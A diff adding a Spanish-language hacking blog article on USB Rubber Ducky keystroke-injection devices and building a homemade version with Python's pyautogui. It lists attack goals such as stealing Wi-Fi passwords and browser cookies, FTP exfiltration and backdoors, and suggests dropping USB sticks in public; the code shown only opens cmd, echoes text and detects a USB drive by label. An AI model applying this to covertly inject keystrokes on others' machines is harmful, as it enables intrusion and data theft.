@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crear Rubber Ducky casero con Python · R3LI4NT</title>
+    <meta name="description" content="Existen una variedad de métodos por los cuales pueden atacar nuestro ordenador. Estamos acostumbrados toparnos con malware a través de descargas, con...">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="../css/styles.css">
+    <link rel="icon" type="image/x-icon" href="../../img/favicon.ico">
+    <style>
+        .article-metadata {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            margin: 1.5rem 0;
+            padding: 1rem;
+            background: rgba(0, 255, 157, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+        }
+
+        .metadata-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .metadata-item i {
+            color: var(--accent-primary);
+            width: 20px;
+        }
+
+        .metadata-item strong {
+            color: var(--text-primary);
+            margin-right: 0.3rem;
+        }
+
+        .tag-container {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin: 1rem 0;
+        }
+
+        .article-tag {
+            padding: 0.3rem 1rem;
+            background: rgba(0, 255, 157, 0.1);
+            border: 1px solid var(--border-color);
+            border-radius: 30px;
+            font-size: 0.8rem;
+            color: var(--accent-primary);
+            transition: all 0.3s;
+        }
+
+        .article-tag:hover {
+            border-color: var(--accent-primary);
+            transform: translateY(-2px);
+            box-shadow: 0 0 15px var(--glow-color);
+        }
+
+        .warning-box {
+            background: rgba(255, 59, 59, 0.1);
+            border-left: 4px solid var(--accent-red);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+        }
+
+        .info-box {
+            background: rgba(59, 123, 255, 0.1);
+            border-left: 4px solid var(--accent-blue);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+        }
+
+        .tip-box {
+            background: rgba(0, 255, 157, 0.1);
+            border-left: 4px solid var(--accent-primary);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+        }
+
+        .command-block {
+            background: #0d1117;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.2rem;
+            margin: 1.5rem 0;
+            font-family: 'Fira Code', monospace;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .command-block pre {
+            margin: 0;
+            color: #b3ff9e;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .code-prompt {
+            color: var(--accent-primary);
+            font-weight: bold;
+            margin-right: 0.5rem;
+        }
+
+        .command-copy {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            padding: 0.3rem 0.8rem;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .command-copy:hover {
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+        }
+
+        .image-container {
+            margin: 2rem 0;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 1rem;
+            background-color: rgba(0, 10, 0, 0.5);
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .image-container:hover {
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 25px var(--glow-color);
+            transform: scale(1.01);
+        }
+
+        .article-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            filter: drop-shadow(0 0 5px rgba(0, 255, 0, 0.3));
+        }
+
+        .clickable-image {
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .clickable-image:hover {
+            filter: brightness(1.2);
+        }
+
+        .image-caption {
+            margin-top: 0.8rem;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+        }
+
+        .zoom-hint {
+            font-size: 0.8rem;
+            color: var(--accent-primary);
+            margin-left: 0.5rem;
+            opacity: 0.7;
+        }
+
+        .image-container:hover .zoom-hint {
+            opacity: 1;
+        }
+
+        .external-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--accent-primary);
+            transition: all 0.3s;
+        }
+
+        .external-link:hover {
+            color: white;
+            border-bottom-color: white;
+            text-shadow: 0 0 8px currentColor;
+        }
+
+        .pagination-article {
+            display: flex;
+            justify-content: space-between;
+            margin: 3rem 0;
+            padding: 1rem 0;
+            border-top: 1px solid var(--border-color);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .pagination-link {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            padding: 0.8rem 1.5rem;
+            border: 1px solid var(--border-color);
+            border-radius: 30px;
+            transition: all 0.3s;
+        }
+
+        .pagination-link:hover {
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+            transform: translateY(-2px);
+        }
+
+        .pagination-link.prev i {
+            margin-right: 0.5rem;
+        }
+
+        .pagination-link.next i {
+            margin-left: 0.5rem;
+        }
+
+        .related-articles {
+            margin: 3rem 0;
+        }
+
+        .related-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        .related-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 1.5rem;
+            transition: all 0.3s;
+            text-decoration: none;
+            color: var(--text-primary);
+        }
+
+        .related-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent-primary);
+            box-shadow: 0 10px 30px var(--glow-color);
+        }
+
+        .related-card h4 {
+            color: var(--accent-primary);
+            margin-bottom: 0.5rem;
+        }
+
+        .related-card p {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+        }
+
+        .related-meta {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+        }
+
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 2rem 0;
+            background: rgba(0, 10, 0, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .comparison-table th {
+            background: rgba(0, 255, 157, 0.2);
+            color: var(--accent-primary);
+            padding: 1rem;
+            text-align: left;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .comparison-table td {
+            padding: 1rem;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        .comparison-table tr:hover td {
+            background: rgba(0, 255, 157, 0.05);
+            color: var(--text-primary);
+        }
+
+        .comparison-table code {
+            color: var(--accent-primary);
+            background: rgba(0, 255, 157, 0.1);
+            padding: 0.2rem 0.5rem;
+            border-radius: 6px;
+        }
+
+        #sidebarToc {
+            max-height: 400px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+        }
+
+        #sidebarToc::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        #sidebarToc::-webkit-scrollbar-thumb {
+            background: var(--accent-primary);
+            border-radius: 4px;
+        }
+
+        #sidebarToc .nav-link {
+            padding: 0.6rem 0.8rem;
+            font-size: 0.9rem;
+            border-left: 2px solid transparent;
+        }
+
+        #sidebarToc .nav-link.active {
+            border-left-color: var(--accent-primary);
+            background: rgba(0, 255, 157, 0.1);
+            color: var(--accent-primary);
+        }
+
+        #sidebarToc .nav-link i {
+            font-size: 0.7rem;
+            opacity: 0.7;
+        }
+
+        @media (max-width: 768px) {
+            .article-metadata {
+                flex-direction: column;
+                gap: 0.8rem;
+            }
+
+            .pagination-article {
+                flex-direction: column;
+                gap: 1rem;
+            }
+        }
+
+        #imageModal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.95);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        #imageModal .modal-content {
+            margin: auto;
+            display: block;
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 12px;
+            border: 3px solid var(--accent-primary);
+            box-shadow: 0 0 50px var(--glow-color);
+            animation: zoom 0.3s ease-in-out;
+        }
+
+        @keyframes zoom {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        #imageModal .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 35px;
+            color: #f1f1f1;
+            font-size: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            z-index: 1001;
+            text-shadow: 0 0 10px var(--accent-primary);
+        }
+
+        #imageModal .modal-close:hover {
+            color: var(--accent-primary);
+            transform: rotate(90deg);
+        }
+
+        #imageModal .modal-caption {
+            margin: 20px auto;
+            display: block;
+            width: 80%;
+            max-width: 700px;
+            text-align: center;
+            color: #ccc;
+            padding: 10px 0;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+        }
+
+        .download-section {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            margin: 2rem 0;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, rgba(0, 255, 157, 0.1), rgba(0, 255, 157, 0.2));
+            border: 1px solid var(--accent-primary);
+            color: var(--accent-primary);
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .download-btn:hover {
+            background: var(--accent-primary);
+            color: black;
+            transform: translateY(-3px);
+            box-shadow: 0 0 20px var(--glow-color);
+        }
+
+        /* ===== Responsive movil mejorado (Android / iPhone) ===== */
+        @media (max-width: 768px) {
+            html, body { overflow-x: hidden; }
+            .container { padding-left: 1rem !important; padding-right: 1rem !important; }
+            img { max-width: 100%; height: auto; }
+            .glitch-wrapper { font-size: 2rem !important; word-break: break-word; line-height: 1.2; }
+            .glitch { word-break: break-word; }
+            .glitch::before, .glitch::after { display: none; }
+            .hero-description { font-size: 1.05rem; }
+            .section-title { font-size: 1.3rem; }
+            .breadcrumb { flex-wrap: wrap; row-gap: 0.3rem; font-size: 0.82rem; }
+            .article-metadata { flex-wrap: wrap; gap: 0.6rem; }
+            .tag-container { flex-wrap: wrap; }
+            .content-card { padding: 1.25rem; }
+            .command-block { padding: 1rem; padding-top: 2.6rem; font-size: 0.85rem; }
+            .command-block pre { white-space: pre-wrap; word-break: break-word; }
+            .comparison-table { display: block; width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+            .article-full a, .article-full code { word-break: break-word; overflow-wrap: anywhere; }
+            #imageModal .modal-content { max-width: 94%; max-height: 78%; }
+            #imageModal .modal-caption { width: 92%; font-size: 0.95rem; }
+            #imageModal .modal-close { top: 10px; right: 16px; font-size: 34px; }
+        }
+        @media (max-width: 480px) {
+            .glitch-wrapper { font-size: 1.55rem !important; }
+            .hero-description { font-size: 0.98rem; }
+            .section-title { font-size: 1.12rem; }
+            .article-full { font-size: 0.95rem; }
+            .content-card { padding: 1rem; }
+            .command-block { font-size: 0.78rem; padding: 0.85rem; padding-top: 2.6rem; }
+            .article-metadata { flex-direction: column; align-items: flex-start; }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <header class="hero" style="min-height: 40vh;">
+            <div class="hero-content">
+                <div class="glitch-wrapper" style="font-size: 2.2rem;">
+                    <div class="glitch" data-text="Crear Rubber Ducky casero con Python">Crear Rubber Ducky casero con Python</div>
+                </div>
+                <p class="hero-description" style="font-size: 1.05rem;">&gt; Existen una variedad de métodos por los cuales pueden atacar nuestro ordenador. Estamos acostumbrados toparnos con malware a través de descargas, con... <span class="os-badge linux" style="margin-left:.6rem;"><i class="fab fa-linux"></i> Linux</span></p>
+                <div class="article-metadata">
+                    <span class="metadata-item"><i class="fas fa-user-secret"></i><strong>Autor:</strong> R3LI4NT</span>
+                    <span class="metadata-item"><i class="fas fa-tag"></i><strong>Categoría:</strong> Hacking</span>
+                    <span class="metadata-item"><i class="fas fa-shield-halved"></i><strong>Nivel:</strong> Práctico</span>
+                </div>
+                <div class="tag-container">
+                    <span class="article-tag"><i class="fab fa-linux"></i> Linux</span>
+                    <span class="article-tag"><i class="fas fa-folder-open"></i> Programación</span>
+                    <span class="article-tag"><i class="fas fa-graduation-cap"></i> Educativo</span>
+                </div>
+            </div>
+        </header>
+
+        <div class="breadcrumb" style="margin: 1rem 0;">
+            <a href="../../index.html" class="breadcrumb-link"><i class="fas fa-home"></i> Inicio</a>
+            <span class="breadcrumb-sep">/</span>
+            <a href="../../index.html#hacking" class="breadcrumb-link"><i class="fas fa-skull"></i> Hacking</a>
+            <span class="breadcrumb-sep">/</span>
+            <span class="breadcrumb-link">Programación</span>
+            <span class="breadcrumb-sep">/</span>
+            <span class="breadcrumb-current">Crear Rubber Ducky casero con Python</span>
+        </div>
+
+        <div class="main-grid">
+            <main>
+                <article class="article-full">
+                    <section class="content-card" id="que-es-un-usb-rubber-ducky-0">
+                        <h2 class="section-title"><span class="hash">#</span> ¿Qué es un USB Rubber Ducky?</h2>
+                        <p>Existen una variedad de métodos por los cuales pueden atacar nuestro ordenador. Estamos acostumbrados toparnos con malware a través de descargas, con enlaces maliciosos (phishing), software malintencionados, entre otros. Pero también a través de dispositivos físicos, como lo es Rubber Ducky.</p>
+<p>Un Rubber Ducky es un pendrive (USB) programado que funciona como un teclado conectado, nada más conectarse comienza a escribir en el equipo de forma automatizada con los payloads ya configurados para lanzar programas y herramientas cargados en el equipo de la víctima o en el propia memoria Micro SD que lleva incluida. Lo que lo hace peligroso es que es indetectable, los sistemas operativos permiten la comunicación con el usuario a través de los teclados USB lo que implica que un Rubebr Ducky sea acepatado como uno más y tenga la posibilidad de desactivar antivirus, entre otros programas de seguridad de suma importancia.</p>
+<h4 style="color: var(--accent-blue); margin: 1.4rem 0 .8rem;">Tipos de ataques con un Rubber Ducky</h4>
+<p>Este ataque se aprovecha de la confianza del usuario para ser llevado a cabo (ingeniería social) o de equipos expuestos. Solo imagina por un momento las miles de posibilidades que puede hacer con este dispositivo, pedirle a un amigo/a que te imprima un documento, acceso a puertos USB de una oficina o cibercafe, arrojar pendrives en zonas públicas y esperar que alguien lo enchufe a su dispositivo y que la información que extraiga la suba a un servidor FTP. Por mencionar algunos ataques:</p>
+<ul>
+<li>
+<p>Robar contraseñas del Wi-Fi.</p>
+</li>
+<li>
+<p>Recolección información sensible del sistema operativo.</p>
+</li>
+<li>
+<p>Robar cookies del navegador.</p>
+</li>
+<li>
+<p>Subir información a través de un servidor FTP.</p>
+</li>
+<li>
+<p>Borrar datos del sistema.</p>
+</li>
+<li>
+<p>Modificar el DNS para engañar a la víctima (Pharming de DNS).</p>
+</li>
+<li>
+<p>Bloquear programas del sistema (antivirus, firewall).</p>
+</li>
+<li>
+<p>Borrar usuarios y agregar permisos administrativos.</p>
+</li>
+<li>
+<p>Infectar el sistema por medio de una descargar vía internet.</p>
+</li>
+<li>
+<p>Crear puerta trasera (backdoor) para acceder de forma remota.</p>
+</li>
+</ul>
+<p>
+  <figure class="image-container" onclick="openImageModal('../img/rubberDucky.png', 'Ilustración del procedimiento')"><img src="../img/rubberDucky.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure>
+</p>
+
+<p>Las especificaciones técnicas que incorpora el Rubber Ducky son:</p>
+<ul>
+<li>
+<p>Ranura para tarjeta Micro SD.</p>
+</li>
+<li>
+<p>Luz LED que indica el estado del dispositivo.</p>
+</li>
+<li>
+<p>Botón que permite re-ejecutar el código.</p>
+</li>
+<li>
+<p>Conector USB Tipo A.</p>
+</li>
+<li>
+<p>Procesador de 60 MHz de 32 bits.</p>
+</li>
+<li>
+<p>Lector USB de memorias micro SD.</p>
+</li>
+<li>
+<p>Case USB.</p>
+</li>
+</ul>
+<p>En seguida que se conecta este USB, es reconocido como un driver Atmel de Windows, engañando al sistema haciéndose pasar por un teclado (para no levantar sospechas y evitar ser bloqueado por antivirus y/o firewall) y ejecutar las teclas indicadas en el código programado (payload).</p>
+<p>
+  <figure class="image-container" onclick="openImageModal('https://blogger.googleusercontent.com/img/a/AVvXsEhKkGfB_D2uI1vyV5SgBe-6aIN3G6gCksHVXCw_qFgnlGKcbw3ZeLhx2NmPh8jgtV84Yt4xpQZ9_S7PKKD_gIUNMmppio90PfTyyLQW08-bllBLOdJcuSmOvw8VIs2vTTwZ06zVUTRMhTT9hP4D4sfXAe9EG0nLNkFop3aJhn11XF8GcSJ96Mx_VAll=w640-h269', 'Ilustración del procedimiento')"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEhKkGfB_D2uI1vyV5SgBe-6aIN3G6gCksHVXCw_qFgnlGKcbw3ZeLhx2NmPh8jgtV84Yt4xpQZ9_S7PKKD_gIUNMmppio90PfTyyLQW08-bllBLOdJcuSmOvw8VIs2vTTwZ06zVUTRMhTT9hP4D4sfXAe9EG0nLNkFop3aJhn11XF8GcSJ96Mx_VAll=w640-h269" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure>
+</p>
+
+<h4 style="color: var(--accent-blue); margin: 1.4rem 0 .8rem;">¿Cómo funciona?</h4>
+<p>Luego de haber visto los componentes de hardware que incorpora el Rubber Ducky, es preciso saber cómo funciona por dentro. Utiliza un lenguaje de programación llamado <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript" target="_blank" class="external-link">"<strong><em>Ducky Script</em></strong>"</a>, compuesto por una sintaxis sencilla de escribir y soportada por cualquier editor de código (Notepad, vi, emacs, nano, gedit, kedit, TextEdit, etc). Cada comando reside en una nueva línea y puede tener opciones a continuación. Los comandos están escritos todo en mayúsculas, algunas instrucciones:</p>
+<table class="comparison-table">
+<thead>
+<tr>
+<th>SINTAXIS</th>
+<th>DESCRIPCIÓN</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>REM</td>
+<td>Comentarios, código que no será ejecutado.</td>
+</tr>
+<tr>
+<td>DELAY</td>
+<td>crea una pausa momentánea en el guión de Ducky. El tiempo DELAY se especifica en milisegundos de 1 a 10000. Se pueden usar varios comandos DELAY para crear retrasos más largos.</td>
+</tr>
+<tr>
+<td>DEFAULT_DELAY / DEFAULTDELAY</td>
+<td>Se debe definir un valor entre 0 y 10000 (milisegundos), el cual establecerá un delay a todas las secuencias de comandos.</td>
+</tr>
+<tr>
+<td>STRING</td>
+<td>Permite inyectar cadenas de caracteres: a-z A-Z 0-9 !-) <code>~+=_-"';:&lt;,&gt;.?[{]}/|!@#$%^&amp;*()</code>.</td>
+</tr>
+<tr>
+<td>WINDOWS / GUI</td>
+<td>Equivale a la tecla windows o la tecla cmd en macos.</td>
+</tr>
+<tr>
+<td>SHIFT</td>
+<td>Simula la tecla SHIFT, y esta se puede combinar con: DELETE, HOME, INSERT, PAGEUP, PAGEDOWN, WINDOWS, GUI, UPARROW, DOWNARROW, LEFTARROW, RIGHTARROW, TAB.</td>
+</tr>
+<tr>
+<td>DELETE</td>
+<td>Simula la tecla suprimir.</td>
+</tr>
+<tr>
+<td>RIGHTARROW / RIGHT</td>
+<td>Simulan las teclas de dirección.</td>
+</tr>
+<tr>
+<td>UPARROW / UP</td>
+<td>Simulan las teclas de dirección.</td>
+</tr>
+<tr>
+<td>HOME</td>
+<td>Equivale a la tecla inicio.</td>
+</tr>
+<tr>
+<td>SPACE</td>
+<td>Equivale a la tecla espacio.</td>
+</tr>
+<tr>
+<td>TAB</td>
+<td>Equivale a la tecla tabulación.</td>
+</tr>
+<tr>
+<td>INSERT</td>
+<td>Equivale a la tecla  insertar.</td>
+</tr>
+<tr>
+<td>BREAK / PAUSE</td>
+<td>Equivale a la combinación CTRL BREAK.</td>
+</tr>
+<tr>
+<td>SCROLLLOCK</td>
+<td>Simula la tecla Scroll Lock.</td>
+</tr>
+<tr>
+<td>END</td>
+<td>Tecla que permite ir al final de algo (página web, documento, etc).</td>
+</tr>
+<tr>
+<td>CAPSLOCK</td>
+<td>Tecla que permite escribir en mayúsculas o minúsculas.</td>
+</tr>
+<tr>
+<td>ALT</td>
+<td>Simula la tecla ALT, y esta se puede combinar con: END, ESC, ESCAPE, F1-F12, caracteres simples (ejemplo: f, s), SPACE, TAB.</td>
+</tr>
+<tr>
+<td>REPEAT</td>
+<td>Repite la cantidad de veces que le indiquemos lo ya ejecutado.</td>
+</tr>
+</tbody>
+</table>
+<p>Quién está detrás de este proyecto es el grupo de hackers <a href="https://shop.hak5.org/products/usb-rubber-ducky" target="_blank" class="external-link">Hak5</a>, se desempeñan en crear kits de herramientas de pentesting para todo público. Enfocados especialmente en la recopilación de información, reconocimiento avanzado, la recopilación de inteligencia de código abierto y más.</p>
+                    </section>
+                    <section class="content-card" id="crear-rubber-ducky-python-1">
+                        <h2 class="section-title"><span class="hash">#</span> CREAR RUBBER DUCKY | Python</h2>
+                        <p>Crearemos nuestro primer payload utilizando el lenguaje Python. Para esto, existen librerías/módulos como <a href="https://pyautogui.readthedocs.io/en/latest/" target="_blank" class="external-link">PyAutoGUI</a> o <a href="https://pypi.org/project/keyboard" target="_blank" class="external-link">KeyBoard</a> que permiten controlar el mouse y el teclado para interactuar de forma automatizada con otras aplicaciones. En mi caso utilizaré la primera, para instalar la librería hay que tener <code>pip</code> (en Python 3.4 incluye pip3 de forma predeterminada) instalado para posteriormente descargar la librería.</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('python -m pip3 install --upgrade pip')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> python -m pip3 install --upgrade pip</pre></div>
+<p>Instalar librería:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('pip3 install pyautogui')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> pip3 install pyautogui</pre></div>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/194966351-d797389d-5097-415e-9e24-c37cdbfb2809.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/194966351-d797389d-5097-415e-9e24-c37cdbfb2809.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Creamos un nuevo archivo y lo guardamos con la extensión <code>.py</code>. Importamos la librería en el código:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('import pyautogui')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> import pyautogui</pre></div>
+<p>El siguiente fragmento de código lo que hará será abrir el símbolo del sistema de windows (CMD) e imprimir los textos indicados en pantalla:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('import pyautogui\n\npyautogui.keyDown(\&#x27;win\&#x27;)\npyautogui.keyDown(\&#x27;r\&#x27;)\npyautogui.keyUp(\&#x27;win\&#x27;)\npyautogui.keyUp(\&#x27;r\&#x27;)\npyautogui.write(\&#x27;cmd\&#x27;)\npyautogui.press(\&#x27;enter\&#x27;)\npyautogui.time.sleep(1)\npyautogui.write(\&#x27;color a\&#x27;)\npyautogui.press(\&#x27;enter\&#x27;)\npyautogui.write(\&#x27;echo Hello!\&#x27;)\npyautogui.press(\&#x27;enter\&#x27;)\npyautogui.write(&quot;echo I\&#x27;m R3LI4NT&quot;)\npyautogui.press(\&#x27;enter\&#x27;)')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> import pyautogui
+
+pyautogui.keyDown(&#x27;win&#x27;)
+pyautogui.keyDown(&#x27;r&#x27;)
+pyautogui.keyUp(&#x27;win&#x27;)
+pyautogui.keyUp(&#x27;r&#x27;)
+pyautogui.write(&#x27;cmd&#x27;)
+pyautogui.press(&#x27;enter&#x27;)
+pyautogui.time.sleep(1)
+pyautogui.write(&#x27;color a&#x27;)
+pyautogui.press(&#x27;enter&#x27;)
+pyautogui.write(&#x27;echo Hello!&#x27;)
+pyautogui.press(&#x27;enter&#x27;)
+pyautogui.write(&quot;echo I&#x27;m R3LI4NT&quot;)
+pyautogui.press(&#x27;enter&#x27;)</pre></div>
+<p>La función <code>keyDown()</code> y <code>keyUp()</code> simulan presionar una tecla y luego soltarla, mientras que <code>write()</code> escribirá los caracteres en la cadena que se pasa. La función <code>press()</code> es un envoltorio de las dos primeras, también simula presionar y soltar una tecla. Por ejemplo, podemos pasar una lista de cadenas para ser presionadas:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('pyautogui.press([\&#x27;enter\&#x27;, \&#x27;enter\&#x27;, \&#x27;enter\&#x27;])')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> pyautogui.press([&#x27;enter&#x27;, &#x27;enter&#x27;, &#x27;enter&#x27;])</pre></div>
+<p>O simplemente establecer cuántas pulsaciones debe realizar:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('pyautogui.press(\&#x27;enter\&#x27;, presses=3)')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> pyautogui.press(&#x27;enter&#x27;, presses=3)</pre></div>
+<p>Es muy importante establecer un intervalo de tiempo entre las pulsasiones de teclas, de lo contrario, no funcionaría correctamente. Esto porque al momento de abrir un programa no podemos decirle que comience a ejecutar la tarea sin que éste aún se haya iniciado. La librería incorpora la función de <code>time.sleep()</code> para establecer el tiempo, se específica en segundos.</p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/195887605-f81266a9-c303-490f-a1cb-275d6e740903.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/195887605-f81266a9-c303-490f-a1cb-275d6e740903.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Una vez el código sea puesto en marcha, el sistema lo reconocerá como si fuera un teclado y ejecutará cada instrucción dada:</p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/195739862-8aa6c9d7-0d26-48c4-a7e8-2a0aeb561df2.gif', 'video-1')"><img src="https://user-images.githubusercontent.com/75953873/195739862-8aa6c9d7-0d26-48c4-a7e8-2a0aeb561df2.gif" alt="video-1" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">video-1 <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>El siguiente paso es programar un checker para detectar el USB una vez se introdujo a la máquina:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('import subprocess,sys,os,time\nfrom time import sleep\nimport psutil,win32api\n\n\ndef get_drives():\n    unidades = subprocess.getoutput(&quot;fsutil fsinfo drives&quot;).split(&quot; &quot;)[1:]\n    last_drive = unidades[-1]\n    len_drives = unidades.index(last_drive)\n\n    return len_drives + 1\n\nwhile True:\n    for controlador in range(0, get_drives()):\n        try:\n            removable = psutil.disk_partitions()[controlador][3].split(&quot;,&quot;)[1]\n\n            if &quot;removable&quot; in removable:\n                USB_nombre = psutil.disk_partitions()[controlador][1]\n                USB_etiqueta = win32api.GetVolumeInformation(f&quot;{USB_nombre}\\\\&quot;)[0]\n\n                if USB_etiqueta == &quot;KINGSTON&quot;:\n                    print(&quot;Dispositivo detectado -&gt; :&quot; +str(USB_etiqueta))\n                    sys.exit()\n\n        except IndexError:\n            pass\n\n    sleep(1) ')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> import subprocess,sys,os,time
+from time import sleep
+import psutil,win32api
+
+
+def get_drives():
+    unidades = subprocess.getoutput(&quot;fsutil fsinfo drives&quot;).split(&quot; &quot;)[1:]
+    last_drive = unidades[-1]
+    len_drives = unidades.index(last_drive)
+
+    return len_drives + 1
+
+while True:
+    for controlador in range(0, get_drives()):
+        try:
+            removable = psutil.disk_partitions()[controlador][3].split(&quot;,&quot;)[1]
+
+            if &quot;removable&quot; in removable:
+                USB_nombre = psutil.disk_partitions()[controlador][1]
+                USB_etiqueta = win32api.GetVolumeInformation(f&quot;{USB_nombre}\\&quot;)[0]
+
+                if USB_etiqueta == &quot;KINGSTON&quot;:
+                    print(&quot;Dispositivo detectado -&gt; :&quot; +str(USB_etiqueta))
+                    sys.exit()
+
+        except IndexError:
+            pass
+
+    sleep(1) </pre></div>
+<p>Con el módulo <code>subprocess</code> le estamos indicando que devuelva la salida del comando <code>fsutil fsinfo drives</code>, cuyo parámetro sirve para enumerar todas las unidades:</p>
+<p><figure class="image-container" onclick="openImageModal('https://user-images.githubusercontent.com/75953873/197083046-018a5781-f874-43fb-b747-3bd1da4e7b7c.png', 'Ilustración del procedimiento')"><img src="https://user-images.githubusercontent.com/75953873/197083046-018a5781-f874-43fb-b747-3bd1da4e7b7c.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>El módulo <code>psutil</code> devuelve todas las particiones de disco montadas como una lista de tuplas con nombre, mientras que con <code>win32api</code> devuelve la información de la tupla especificada (USB_nombre). Si dentro de la variable <strong>USB_etiqueta</strong> se encuentra la partición indicada (nombre del volumen [KINGSTON]), entonces ejecuta la acción dada, que en este caso es detectarlo e imprimir el nombre del volumen.</p>
